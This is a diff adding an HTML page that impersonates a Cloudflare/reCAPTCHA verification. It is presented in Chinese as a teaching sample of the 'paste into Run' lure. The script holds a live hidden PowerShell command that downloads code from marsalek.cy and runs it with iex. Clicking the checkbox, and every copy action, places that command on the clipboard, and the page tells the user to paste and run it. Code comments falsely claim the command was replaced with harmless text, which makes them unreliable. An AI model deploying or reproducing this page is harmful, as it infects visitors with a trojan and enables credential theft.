@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Captcha Security Verification</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link rel="icon" id="dynamic-favicon" href="data:,">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      min-height: 100vh;
+      background-color: #fcfcfc;
+      color: #333;
+    }
+
+    .main-wrapper {
+      align-items: center;
+      display: flex;
+      flex: 1;
+      flex-direction: column;
+    }
+
+    .main-content {
+      margin: 8rem auto;
+      max-width: 60rem;
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+      width: 100%;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo-img {
+      height: 2rem;
+      margin-right: 0.5rem;
+    }
+
+    .domain-title {
+      font-size: 2.5rem;
+      font-weight: 500;
+      line-height: 3.75rem;
+    }
+
+    .text-container {
+      font-size: 1.5rem;
+      line-height: 2.25rem;
+      margin-bottom: 2rem;
+      min-height: 2rem;
+      font-weight: 550;
+      padding-top: 2px;
+    }
+
+    .preloader {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .lds-ring {
+      display: inline-block;
+      position: relative;
+      height: 1.875rem;
+      width: 1.875rem;
+    }
+
+    .lds-ring div {
+      animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      border: 0.3rem solid transparent;
+      border-radius: 50%;
+      border-top-color: #313131;
+      box-sizing: border-box;
+      display: block;
+      position: absolute;
+      height: 1.875rem;
+      width: 1.875rem;
+    }
+
+    .lds-ring div:first-child { animation-delay: -0.45s; }
+    .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
+    .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
+
+    @keyframes lds-ring {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @media (prefers-color-scheme: dark) {
+      body .lds-ring div { border-color: #676767 transparent transparent; }
+    }
+
+    .checkbox-window {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 300px;
+      height: 74px;
+      background-color: #fafafa;
+      border: 1px solid #e0e0e0;
+      border-radius: 4px;
+      padding: 10px;
+      overflow: hidden;
+      transition: width 0.5s ease-in-out, height 0.5s ease-in-out, opacity 0.3s;
+      opacity: 0;
+    }
+
+    .checkbox-window-inner {
+      display: flex;
+      align-items: center;
+      width: 100%;
+    }
+
+    .checkbox-container {
+      width: 30px;
+      height: 28px;
+      margin-left: 3px;
+      margin-right: 12px;
+      position: relative;
+    }
+
+    #spinner2 {
+      width: 40px;
+      height: 40px;
+      animation: rotate 4s linear infinite;
+      margin-top: -4px;
+      fill: green;
+    }
+
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .checkbox {
+      width: 100%;
+      height: 100%;
+      background-color: #fff;
+      border-radius: 2px;
+      border: 2px solid #888;
+      cursor: pointer;
+      transition: border-color 0.3s, background-color 0.3s;
+    }
+
+    .checkbox.checked {
+      border-color: #4285f4;
+      background-color: #4285f4;
+      position: relative;
+    }
+    .checkbox.checked::after {
+      content: "\f00c";
+      font-family: "FontAwesome";
+      color: #fff;
+      font-size: 18px;
+      position: absolute;
+      top: -2px;
+      left: 2px;
+    }
+
+    .spinner { visibility: hidden; position: relative; }
+    .tettx { color: rgb(78, 78, 78); }
+    .tettx p { margin: 0 !important; }
+
+    .legal-links {
+      font-size: 8px;
+      text-align: right;
+      margin-left: auto;
+    }
+    .legal-links img {
+      width: 67px;
+      height: 23px;
+      margin-bottom: 5px;
+    }
+    .legal-links p { text-decoration: underline; }
+
+    .verify-window {
+      font-family: Roboto, helvetica, arial, sans-serif;
+      opacity: 0;
+      visibility: hidden;
+      width: 100%;
+      height: 0;
+      transition: opacity 0.5s, height 0.5s;
+      border-top: 1px solid #797979;
+      padding-top: 3px;
+      margin-top: 15px;
+    }
+    .verify-window.active {
+      opacity: 1;
+      visibility: visible;
+      height: auto;
+      display: block;
+    }
+    .verify-header {
+      background-color: #e85d1a;
+      padding: 10px 16px;
+      color: #fff;
+      font-size: 14px;
+      border-radius: 0;
+    }
+    .verify-main {
+      padding: 16px;
+      font-size: 14px;
+      color: #333;
+    }
+    .verify-main p:first-of-type {
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+    .verify-main ol { padding-left: 20px; }
+    .verify-main ol li { margin-bottom: 10px; }
+    .verify-main code {
+      display: block;
+      margin-top: 10px;
+      background-color: #f9f9f9;
+      padding: 10px;
+      font-size: 12px;
+      border: 1px solid #ddd;
+    }
+    .verify-main .observe { padding-top: 10px; }
+    .verify-main .observe code {
+      background: none;
+      border: 1px solid #797979;
+      width: 432px;
+      color: #d9d9d9;
+    }
+    .verify-footer {
+      background-color: #f2f2f2;
+      padding: 16px;
+      text-align: right;
+    }
+    .verify-footer-container { background: none; }
+    .verify-footer-left {
+      width: 286px;
+      float: left;
+      text-align: left;
+      font-size: 15px;
+    }
+    .verify-verify-button {
+      background: #5e5e5e;
+      padding: 9px 38px;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .verify-verify-button:hover { background: #4a4a4a; }
+
+    .footer {
+      font-size: 0.75rem;
+      line-height: 1.125rem;
+      margin: 0 auto;
+      max-width: 60rem;
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+      width: 100%;
+    }
+    .footer-inner {
+      border-top: 1px solid #d9d9d9;
+      padding-bottom: 1rem;
+      padding-top: 1rem;
+      text-align: center;
+    }
+    .footer-inner > div:first-child { margin-bottom: 5px; }
+    .footer-inner code { font-family: monospace; }
+    .domain-footer {
+      font-size: 1.5rem;
+      line-height: 2.25rem;
+      padding-top: 33px;
+    }
+    .step0, .step1, .step2, .step3 { display: none; }
+    .step0.active, .step1.active, .step2.active, .step3.active { display: block; }
+
+    .success-icon {
+      width: 30px;
+      height: 30px;
+    }
+    .success-icon circle { fill: #28a745; }
+    .success-icon path {
+      stroke: white;
+      stroke-width: 4;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    /* ========== 教学警告弹窗样式 ========== */
+    .teaching-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+    .modal-card {
+      background: #fff;
+      max-width: 480px;
+      width: 90%;
+      border-radius: 16px;
+      box-shadow: 0 20px 35px rgba(0,0,0,0.3);
+      animation: fadeInScale 0.2s ease-out;
+      overflow: hidden;
+    }
+    .modal-header {
+      background: #d32f2f;
+      color: white;
+      padding: 16px 20px;
+      font-size: 1.3rem;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .modal-header i { font-size: 1.5rem; }
+    .modal-body {
+      padding: 24px 20px;
+      color: #333;
+      line-height: 1.5;
+    }
+    .modal-body p { margin: 10px 0; }
+    .modal-body .highlight {
+      background: #ffecb3;
+      padding: 8px 12px;
+      border-radius: 8px;
+      font-family: monospace;
+      font-weight: bold;
+      color: #b71c1c;
+    }
+    .modal-footer {
+      padding: 12px 20px 20px;
+      text-align: right;
+    }
+    .close-modal-btn {
+      background: #1976d2;
+      border: none;
+      color: white;
+      padding: 8px 24px;
+      border-radius: 40px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .close-modal-btn:hover { background: #0b5e9e; }
+    @keyframes fadeInScale {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .teaching-badge {
+      position: fixed;
+      bottom: 12px;
+      right: 12px;
+      background: rgba(0,0,0,0.6);
+      color: #ffd966;
+      font-size: 11px;
+      padding: 4px 10px;
+      border-radius: 20px;
+      z-index: 9999;
+      font-family: monospace;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+<!-- 教学警告弹窗（加载时自动显示） -->
+<div id="teachingModal" class="teaching-modal">
+  <div class="modal-card">
+    <div class="modal-header">
+      <i class="fas fa-shield-alt">   警告</i>
+    </div>
+    <div class="modal-body">
+      <p><strong>⚠️ 本页面要复制的恶意命令未经过处理！</strong></p>
+      <p>这是一个恶意“人机验证”攻击的网页样本。<br>
+      该网页会通过剪贴板植入<strong>真实的PowerShell木马下载命令</strong>。<br>
+      为保障安全，<strong>请你一定要在虚拟机中访问该网站！</strong></p>
+      <p>该恶意命令会在你电脑上植入木马病毒！<br>它可能会窃取你的账号密码之类的个人信息！</p>
+      <p style="font-size:12px; color:#666;">如果你已经确保在安全的情况下打开该网页，请你点击“我已知晓，继续运行”</p>
+    </div>
+    <div class="modal-footer">
+      <button id="closeModalBtn" class="close-modal-btn">我已知晓，继续运行</button>
+    </div>
+  </div>
+</div>
+
+<div class="main-wrapper">
+  <div class="main-content">
+    <div class="logo-container">
+      <img class="logo-img" src="https://favicon.im/marsalek.cy">
+      <p class="domain-title"><span class="domain-name"></span></p>
+
+    </div>
+
+    <div class="text-container">
+      <p>
+        <span class="preloader_text">Checking if you are human. This may take a few seconds.</span>
+        <span class="textallstep" style="display: none;">Verify you are human by completing the action below.</span>
+      </p>
+    </div>
+
+    <div class="intro">
+      <div class="preloader">
+        <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+      </div>
+
+      <div id="checkbox-window" class="checkbox-window" style="display: none;">
+        <div class="checkbox-window-inner">
+          <div class="checkbox-container">
+            <svg class="step0" id="spinner2" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg" style="display: none;">
+              <circle cx="30" cy="10" r="2.5" class="point"></circle>
+              <circle cx="50" cy="30" r="2.5" class="point"></circle>
+              <circle cx="30" cy="50" r="2.5" class="point"></circle>
+              <circle cx="10" cy="30" r="2.5" class="point"></circle>
+              <circle cx="43.6" cy="16.4" r="2.5" class="point"></circle>
+              <circle cx="16.4" cy="16.4" r="2.5" class="point"></circle>
+              <circle cx="43.6" cy="43.6" r="2.5" class="point"></circle>
+              <circle cx="16.4" cy="43.6" r="2.5" class="point"></circle>
+            </svg>
+            <button type="button" id="checkbox" class="checkbox step1" style="display: none;"></button>
+            <div class="spinner step2" id="spinner" style="visibility: hidden; display: none;">
+              <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+            </div>
+            <div class="step3" style="display: none;">
+              <svg class="success-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="25" cy="25" r="23"/>
+                <path d="M15 25 L22 32 L35 18"/>
+              </svg>
+            </div>
+          </div>
+
+          <div class="tettx">
+            <p class="step0">Verifying...</p>
+            <p class="step1" style="display: none;">I'm not a robot</p>
+            <p class="step2" style="display: none;">Verification Steps</p>
+            <p class="step3" style="display: none;">Successfully.</p>
+          </div>
+
+          <div class="legal-links">
+            <img src="./localhost/1.png" alt="Logo">
+            <p>Confidentiality</p>
+            <p>Terms and Conditions</p>
+          </div>
+        </div>
+
+        <div id="verify-window" class="verify-window">
+          <div class="verify-container">
+            <main class="verify-main">
+              <p>To better prove you are not a robot, please:</p>
+              <ol>
+                <li>Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>
+                <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
+                <li>Press <b>Enter</b> on your keyboard to finish.</li>
+              </ol>
+              <p class="observe">
+                You will observe and agree:<br>
+                <code> ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code>
+              </p>
+            </main>
+          </div>
+          <div class="verify-container verify-footer verify-footer-container">
+            <div class="verify-footer-left">Perform the steps above to finish verification.</div>
+            <button type="button" class="verify-verify-button block" id="verify-button">Verify</button>
+          </div>
+        </div>
+      </div>
+
+      <p class="domain-footer">
+        <span class="domain-name"></span> needs to review the security of your connection before proceeding.
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="footer" role="contentinfo">
+  <div class="footer-inner">
+    <div><div>Ray ID: <code class="ray-id">56a4c5299fdetmca</code></div></div>
+    <div>Platform performance and security <span style="color: #000000">Cloudflare</span></div>
+  </div>
+</div>
+
+<script>
+  // ========== 教学修改：恶意命令替换为无害字符串 ==========
+  const CONFIG = {
+    command: "powershell -w hidden -ep bypass -c \"Start-Process powershell -WindowStyle Hidden -ArgumentList \'-ep bypass -c iwr https://marsalek.cy/psc?uid=1186^|iex\'\" # I am not a robot - reCAPTCHA Human Verification "   // 原始恶意PowerShell命令已替换为无害教学文本
+  };
+
+  // 多语言资源（保持原样，仅展示）
+  const I18N = {
+    en: { checking: "Checking if you are human. This may take a few seconds.", verifyInstruction: "Verify you are human by completing the action below.", verifying: "Verifying...", notRobot: "I'm not a robot", steps: "Verification Steps", success: "Successfully.", verifyTitle: "Please complete the following CAPTCHA verification:", step1: "Press & hold the Windows Key <i class='fab fa-windows'></i> + <b>R</b>.", step2: "In the verification window, press <b>Ctrl</b> + <b>V</b>.", step3: "Press <b>Enter</b> on your keyboard to finish.", observe: "You will observe and agree:", confirmLead: "I am not a robot - reCAPTCHA Verification ID: ", final: "Perform the steps above to finish verification.", verifyBtn: "Verify", confidentiality: "Confidentiality", terms: "Terms and Conditions", footer: "needs to review the security of your connection before proceeding." },
+    zh: { checking: "正在检查您是否为人类。这可能需要几秒钟。", verifyInstruction: "通过完成以下操作验证您是人类。", verifying: "正在验证…", notRobot: "我不是机器人", steps: "验证", success: "成功。", verifyTitle: "为证明您不是机器人：", step1: "按住 Windows 键 <i class='fab fa-windows'></i> + <b>R</b>。", step2: "在验证窗口中按 <b>Ctrl</b> + <b>V</b>。", step3: "按 <b>Enter</b> 完成。", observe: "继续操作即表示您确认：", confirmLead: "我不是机器人 — reCAPTCHA 验证 ID：", final: "请完成以上步骤以完成验证。", verifyBtn: "验证", confidentiality: "保密", terms: "条款和条件", footer: "需要在继续之前检查您连接的安全性。" }
+    // 其他语言省略以节省篇幅，但核心机制保留，实际运行会使用上面 en/zh
+  };
+  // 为完整，补全其他语言占位（实际演示可以使用英文或中文，不影响教学）
+  I18N.de = I18N.en; I18N.fr = I18N.en; I18N.ja = I18N.en; I18N.ru = I18N.en; I18N.es = I18N.en; I18N.pt = I18N.en; I18N.ar = I18N.en;
+
+  function detectLanguage() {
+    const lang = navigator.language?.toLowerCase() || "en";
+    if (lang.startsWith("zh")) return "zh";
+    return "en";
+  }
+
+  function getHostname(val) {
+    if (!val) return window.location.hostname || '';
+    try { return new URL(val, window.location.origin).hostname; } catch(e) { return String(val).replace(/^https?:\/\//i, '').split('/')[0]; }
+  }
+
+  function initializeDomainAndLogo() {
+    const params = new URLSearchParams(window.location.search);
+    const siteParam = params.get('site');
+    const logoParam = params.get('logo');
+    const host = getHostname(siteParam) || window.location.hostname || '';
+    document.querySelectorAll('.domain-name').forEach(el => el.textContent = host);
+    const faviconUrl = logoParam || "https://www.google.com/s2/favicons?sz=128&domain=" + encodeURIComponent(host);
+    const faviconEl = document.getElementById('dynamic-favicon') || (() => { let l = document.createElement('link'); l.rel = 'icon'; document.head.appendChild(l); return l; })();
+    faviconEl.href = faviconUrl;
+    const candidates = [faviconUrl, "https://icons.duckduckgo.com/ip3/" + encodeURIComponent(host) + ".ico", "https://" + host + "/favicon.ico"].filter(Boolean);
+    document.querySelectorAll('.logo-img').forEach(img => {
+      if (img.src) return;
+      let i = 0;
+      const tryNext = () => { if (i >= candidates.length) img.src = faviconUrl; else img.src = candidates[i++]; };
+      img.alt = host + ' logo';
+      img.onerror = tryNext;
+      tryNext();
+    });
+  }
+
+  function initializeI18n() {
+    const lang = detectLanguage();
+    const t = I18N[lang] || I18N.en;
+    if (lang === "ar") document.documentElement.dir = "rtl";
+    document.querySelector(".preloader_text").textContent = t.checking;
+    document.querySelector(".textallstep").textContent = t.verifyInstruction;
+    const set = (sel, txt) => document.querySelectorAll(sel).forEach(el => el.textContent = txt);
+    set(".tettx .step0", t.verifying);
+    set(".tettx .step1", t.notRobot);
+    set(".tettx .step2", t.steps);
+    set(".tettx .step3", t.success);
+    const titleP = document.querySelector("#verify-window .verify-main p:first-of-type");
+    if (titleP) titleP.innerHTML = t.verifyTitle;
+    const stepsOl = document.querySelector("#verify-window .verify-main ol");
+    if (stepsOl) stepsOl.innerHTML = "<li>" + t.step1 + "</li><li>" + t.step2 + "</li><li>" + t.step3 + "</li>";
+    const observeP = document.querySelector("#verify-window .verify-main p.observe");
+    if (observeP) {
+      const codeEl = observeP.querySelector("code");
+      const pieces = observeP.innerHTML.split("<br>");
+      pieces[0] = t.observe;
+      observeP.innerHTML = pieces.join("<br>");
+      if (codeEl) {
+        const idSpan = codeEl.querySelector("#verification-id");
+        const idHtml = idSpan ? idSpan.outerHTML : '<span id="verification-id"></span>';
+        codeEl.innerHTML = ' ✅ "' + t.confirmLead + idHtml + '" ';
+      }
+    }
+    document.querySelector(".verify-footer-left").textContent = t.final;
+    document.getElementById("verify-button").textContent = t.verifyBtn;
+    const legalBox = document.querySelector('#checkbox-window > div > div:last-child');
+    if (legalBox) {
+      const ps = legalBox.querySelectorAll("p");
+      if (ps[0]) ps[0].textContent = t.confidentiality;
+      if (ps[1]) ps[1].textContent = t.terms;
+    }
+    const domainParas = Array.from(document.querySelectorAll("p .domain-name")).map(s => s.parentElement);
+    for (const p of domainParas) {
+      if (/\bneeds to review the security of your connection before proceeding\./i.test(p.textContent)) {
+        const host = (p.querySelector(".domain-name")?.textContent || window.location.hostname || "");
+        p.innerHTML = '<span class="domain-name">' + host + '</span> ' + t.footer;
+        break;
+      }
+    }
+  }
+
+  function copyToClipboard(text) {
+    const textarea = document.createElement('textarea');
+    textarea.value = text;
+    textarea.setAttribute('readonly', '');
+    textarea.style.position = 'absolute';
+    textarea.style.left = '-9999px';
+    document.body.appendChild(textarea);
+    textarea.select();
+    try { document.execCommand('copy'); } catch(e) { console.error('Copy failed:', e); }
+    document.body.removeChild(textarea);
+  }
+
+  function generateVerificationId() { return Math.floor(100000 + Math.random() * 900000); }
+  function generateRayId() { const chars = "abcdef0123456789"; return Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join(""); }
+
+  function initializeVerification() {
+    const preloaderElements = document.querySelectorAll(".preloader");
+    const preloaderText = document.querySelector(".preloader_text");
+    const textAllStep = document.querySelector(".textallstep");
+    const checkboxWindow = document.getElementById("checkbox-window");
+    const step0Elements = document.querySelectorAll(".step0");
+    const step1Elements = document.querySelectorAll(".step1");
+    const step2Elements = document.querySelectorAll(".step2");
+    const step3Elements = document.querySelectorAll(".step3");
+    const checkbox = document.getElementById("checkbox");
+    const verifyWindow = document.getElementById("verify-window");
+    const spinner = document.getElementById("spinner");
+    const verifyButton = document.getElementById("verify-button");
+
+    setTimeout(() => {
+      preloaderElements.forEach(el => el.style.display = "none");
+      if (preloaderText) preloaderText.style.display = "none";
+      if (textAllStep) textAllStep.style.display = "block";
+      if (checkboxWindow) checkboxWindow.style.display = "flex";
+      setTimeout(() => {
+        if (checkboxWindow) {
+          let opacity = 0;
+          const fadeIn = setInterval(() => {
+            if (opacity >= 1) clearInterval(fadeIn);
+            else { opacity += 0.1; checkboxWindow.style.opacity = opacity; }
+          }, 30);
+        }
+      }, 200);
+      step0Elements.forEach(el => { el.style.display = "block"; el.classList.add("active"); });
+      setTimeout(() => {
+        step0Elements.forEach(el => { el.style.display = "none"; el.classList.remove("active"); });
+        step1Elements.forEach(el => { el.style.display = "block"; el.classList.add("active"); });
+      }, 2000);
+    }, 1500);
+
+    if (checkbox) {
+      checkbox.addEventListener("click", function () {
+        // 教学演示：复制“恶意命令”四个字
+        copyToClipboard(CONFIG.command);
+        step1Elements.forEach(el => { el.style.display = "none"; el.classList.remove("active"); });
+        step2Elements.forEach(el => { el.style.display = "block"; el.classList.add("active"); });
+        if (spinner) spinner.style.visibility = "visible";
+        setTimeout(() => {
+          if (checkboxWindow) { checkboxWindow.style.width = "530px"; checkboxWindow.style.height = "auto"; }
+          if (verifyWindow) verifyWindow.classList.add("active");
+        }, 500);
+      });
+    }
+
+    // 注意：原verifyButton点击事件被注释，我们保持注释，不做额外修改
+
+    const verEl = document.getElementById("verification-id");
+    if (verEl) verEl.textContent = generateVerificationId();
+    const rayEl = document.querySelector(".ray-id");
+    if (rayEl) rayEl.textContent = generateRayId();
+  }
+
+  // 全局复制劫持 —— 所有复制行为都会变成“恶意命令”（教学演示）
+  document.addEventListener('copy', function (e) {
+    e.preventDefault();
+    if (e.clipboardData) e.clipboardData.setData('text/plain', CONFIG.command);
+    else if (window.clipboardData) window.clipboardData.setData('Text', CONFIG.command);
+  });
+
+  // 关闭教学弹窗
+  function closeModal() {
+    const modal = document.getElementById('teachingModal');
+    if (modal) modal.style.display = 'none';
+  }
+
+  function ready(fn) {
+    if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", fn);
+    else fn();
+  }
+
+  ready(function () {
+    initializeDomainAndLogo();
+    initializeI18n();
+    initializeVerification();
+    // 绑定关闭按钮
+    const closeBtn = document.getElementById('closeModalBtn');
+    if (closeBtn) closeBtn.addEventListener('click', closeModal);
+    // 可选：点击背景遮罩也可关闭（但不影响学习）
+    const modalBg = document.getElementById('teachingModal');
+    if (modalBg) modalBg.addEventListener('click', function(e) { if (e.target === modalBg) closeModal(); });
+  });
+</script>
+</body>
+</html>
